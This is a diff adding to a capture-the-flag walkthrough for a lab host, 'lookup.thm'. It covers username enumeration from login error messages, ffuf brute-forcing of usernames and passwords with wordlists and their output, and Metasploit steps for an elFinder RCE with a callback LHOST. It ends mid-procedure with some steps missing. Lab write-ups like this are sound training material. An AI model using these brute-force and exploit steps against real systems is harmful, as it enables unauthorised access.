@@ -28,7 +28,10 @@ Using this parameter We will hit a curl req with below command to test for valid
 ```
 curl -v -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
 ```
-
+```
+Wrong username or password. Please try again.
+Redirecting in 3 seconds.
+```
 The Req header in the curl were 
 ```
 > POST /login.thm HTTP/1.1
@@ -86,4 +89,62 @@ Now we can see for admin the response was differ. So we tried with admin usernam
 
 ``` 
 Wrong password. Please try again.
-Redirecting in 3 seconds. ```
+Redirecting in 3 seconds. 
+```
+See the error that we got from the curl at very top and the error that we are getting now has a difference that the error that we got now tells us that username is correct.
+Meaning we have found 1 valid user. We will now user another wordlist.
+
+```
+ffuf -v  -u http://lookup.thm/login.php \
+-w /home/Seclists/Usernames/Names/names.txt:USER \
+-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
+-X POST \
+-d "username=USER&password=PASS" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-fs 74 -fw 10
+```
+As you run it you will find another user.
+```
+[Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 75ms]
+| URL | http://lookup.thm/login.php
+    * PASS: 111111
+    * USER: admin
+
+[Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 63ms]
+| URL | http://lookup.thm/login.php
+    * PASS: 111111
+    * USER: jose
+```
+
+So now we have a valid another username jose. 
+
+now we will ffuf for same user but for passwords only for the username jose.
+```
+ffuf -v  -u http://lookup.thm/login.php \
+-w /home/Seclists/Passwords/Common-Credentials/best1050.txt:PASS \
+-X POST \
+-d "username=jose&password=PASS" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-fs 62 -fw 8
+```
+Now you will get the password. Login there with credentials in the web.
+
+You will now land us to http://files.lookup.thm/ but this is not in out /etc/hosts files so we add it too into out hosts file with the command
+
+now after adding do enter credentials again and you land at the page http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw.
+Here you can see each file open and see it. after a lot of enumuration i was able to find the version of elfinder(The web file-manager that is being used here.)
+
+And its version was vulnerable to rce. so i used msfconsole to do this task.
+to get the exploit just use the preinstalled kali tool searchsploit. by  the command searchsploit -c "elfinder with version number"
+after getting the exploit.
+Do start msfconsole by typing it into the terminal and when it starts do run "search <elfinder with version number>" then you will get a exploit path
+
+Then do "use <exploit_path>"
+set the rhosts to files.lookup.thm by the command set RHOSTS files.lookup.thm
+set the lhost to tun0 by the command set LHOST tun0
+then enter the command run and hit enter. The exploit runs.
+But i got the error.
+<msf_error>
+so to resolving steps were : -
+Set the rhosts to room_ip by the command set RHOSTS <room_ip>
+Next set the vhost to files.lookup.thm by the command set VHOST files.lookup.thm
